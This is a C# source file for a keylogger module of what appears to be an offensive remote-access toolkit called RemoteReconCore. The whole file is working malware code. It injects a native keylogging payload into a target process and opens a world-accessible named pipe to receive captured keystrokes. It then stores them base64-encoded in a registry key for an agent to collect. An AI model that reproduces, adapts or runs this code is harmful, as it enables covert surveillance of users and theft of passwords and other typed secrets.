using System;
using System.Collections.Generic;
using System.Text;
using System.Threading;
using ReflectiveInjector;
using System.Runtime.InteropServices;
using System.Security.AccessControl;

namespace RemoteReconCore
{
    public class Keylogger : IJobs
    {
        private int targetPid;
        private static Thread t;
        public Keylogger(int pid)
        {
            targetPid = pid;
        }

        public KeyValuePair<int, string> Run()
        {
            byte[] keylogMod = Agent.PatchRemoteReconNative("keylog");
            Injector keylog = new Injector(targetPid, keylogMod);
            if (!keylog.Inject())
                return new KeyValuePair<int, string>(2, "Failed to inject keylogger");
            else
            {
#if DEBUG 
                Console.WriteLine("Injected Keylogger");
#endif
                try
                {
                    //Start the named pipe server and keylog listener in the background
                    Agent.t = new Thread(() =>
                    {
                        ReceiveKeyStrokes();
                    });
                    Agent.t.SetApartmentState(ApartmentState.STA);
                    Agent.t.IsBackground = true;
                    Agent.t.Start();
#if DEBUG
                    Console.WriteLine("Started background thread to sync keylogger");
#endif
                    string msg = Convert.ToBase64String(Encoding.ASCII.GetBytes("Keylogger successfully started"));
                    return new KeyValuePair<int, string>(0, msg);
                }
                catch (Exception)
                {
                    string msg = Convert.ToBase64String(Encoding.ASCII.GetBytes("Keylog background thread failed to start"));
                    return new KeyValuePair<int, string>(2, msg);
                }
                
            }
            
        }

        private void ReceiveKeyStrokes()
        {
            string enc = "";

            try
            {
                //Used PInvoke here instead of the IO.Pipes class because that class does not have a PeekNamedPipe method
                IntPtr sa = CreateNullDescriptorPtr();
                hPipe = CreateNamedPipe(@"\\.\pipe\svc_kl",
                                               PIPE_ACCESS_INBOUND,
                                               (PIPE_READMODE_BYTE | PIPE_WAIT),
                                               1,
                                               0,
                                               1024,
                                               10000,
                                               sa);
#if DEBUG
                Console.WriteLine("Waiting for client to connect");
#endif
                //Blocking call to wait for a client to connect
                ConnectNamedPipe(hPipe, IntPtr.Zero);
            }
            catch (Exception e)
            {
#if DEBUG
                Console.WriteLine(e.ToString());
#endif
                string msg = Convert.ToBase64String(Encoding.ASCII.GetBytes(e.ToString()));
                Agent.rrbase.SetValue(Agent.modkey, msg);
            }
            
            
#if DEBUG
            Console.WriteLine("Received connection from client");
            Console.WriteLine("Starting loop");
#endif
            while(true)
            {
                
                Thread.Sleep(1000);

                //Check to make sure the pipe is connected
                if (ConnectNamedPipe(hPipe, IntPtr.Zero) == false && (uint)Marshal.GetLastWin32Error() != ERROR_PIPE_CONNECTED)
                    break;

                //Variables for PeekNamedPipe and ReadFile
                byte[] readBuff = new byte[1024];
                uint bytesRead = 0;
                uint bytesAvail = 0;
                uint bytesLeft = 0;
                uint read = 0;
                string oldVal = "";
                
                
                try
                {
                    //Check if there is data to read in the pipe
                    if (!PeekNamedPipe(hPipe, null, 0, ref bytesRead, ref bytesAvail, ref bytesLeft) && bytesAvail == 0)
                        continue;
                    //If we can't read for some reason, continue
                    if (!ReadFile(hPipe, readBuff, (uint)readBuff.Length, ref read, IntPtr.Zero))
                        continue;

                    string ks = Encoding.UTF8.GetString(readBuff);

                    ks = ks.TrimEnd(new char[] { '\0'});
#if DEBUG
                    Console.Write(ks);
#endif
                    //Append the newly recorded keystrokes to the old value that was stored in the registry
                    oldVal = Encoding.ASCII.GetString(Convert.FromBase64String((string)Agent.rrbase.GetValue(Agent.kkey)));
                    oldVal = oldVal + ks;
                    enc = Convert.ToBase64String(Encoding.UTF8.GetBytes(oldVal));
                }
                catch (Exception e)
                {
                    enc = Convert.ToBase64String(Encoding.ASCII.GetBytes(e.ToString()));
#if DEBUG
                    Console.WriteLine("Error: \n" + e.ToString());
#endif
                }

                Agent.rrbase.SetValue(Agent.kkey, enc);
            }

#if DEBUG
            Console.WriteLine("Client disconnected");
#endif
            if (!DisconnectNamedPipe(hPipe))
                Agent.rrbase.SetValue(Agent.modkey, Convert.ToBase64String(Encoding.ASCII.GetBytes("Unable to disconnect named pipe server")));

            CloseHandle(hPipe);
            
        }

        //Helper function to create a SECURITY_ATTRIBUTES structure with a allow everyone Security Descriptor
        private static IntPtr CreateNullDescriptorPtr()
        {
            RawSecurityDescriptor gsd = new RawSecurityDescriptor(ControlFlags.DiscretionaryAclPresent, null, null, null, null);
            SECURITY_ATTRIBUTES sa = new SECURITY_ATTRIBUTES();
            sa.nLength = Marshal.SizeOf(typeof(SECURITY_ATTRIBUTES));
            sa.bInheritHandle = 1;
            byte[] desc = new byte[gsd.BinaryLength];
            gsd.GetBinaryForm(desc, 0);
            sa.lpSecurityDescriptor = Marshal.AllocHGlobal(desc.Length);
            Marshal.Copy(desc, 0, sa.lpSecurityDescriptor, desc.Length);

            IntPtr sec = Marshal.AllocHGlobal(Marshal.SizeOf(sa));
            Marshal.StructureToPtr(sa, sec, true);

            return sec;
        }

        //PInvoke Definitions
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr CreateNamedPipe(string Pipename,
                                                      uint dwOpenMode,
                                                      uint dwPipeMode,
                                                      uint nMaxInstances,
                                                      uint nOutBufferSize,
                                                      uint nInBufferSize,
                                                      uint nDefaultTimeout,
                                                      IntPtr lpSecurityAttributes);


        [DllImport("kernel32.dll", EntryPoint = "PeekNamedPipe", SetLastError = true)]
        private static extern bool PeekNamedPipe(IntPtr handle,
                                                 byte[] buffer, 
                                                 uint nBufferSize, 
                                                 ref uint bytesRead,
                                                 ref uint bytesAvail, 
                                                 ref uint BytesLeftThisMessage);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool ReadFile(IntPtr handle, byte[] buffer, uint toRead, ref uint read, IntPtr lpOverLapped);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool ConnectNamedPipe(IntPtr pHandle, IntPtr overlapped);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool DisconnectNamedPipe(IntPtr pHandle);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr hHandle);

        [StructLayout(LayoutKind.Sequential)]
        private struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public IntPtr lpSecurityDescriptor;
            public int bInheritHandle;
        }

        private IntPtr hPipe;
        private const uint INBOUND = 0x00000001;
        private const uint PIPE_ACCESS_INBOUND = 0x00000001;
        private const uint PIPE_READMODE_BYTE = 0x00000000;
        private const uint PIPE_WAIT = 0x00000000;
        private const ulong ERROR_PIPE_CONNECTED = 535;
    }
}
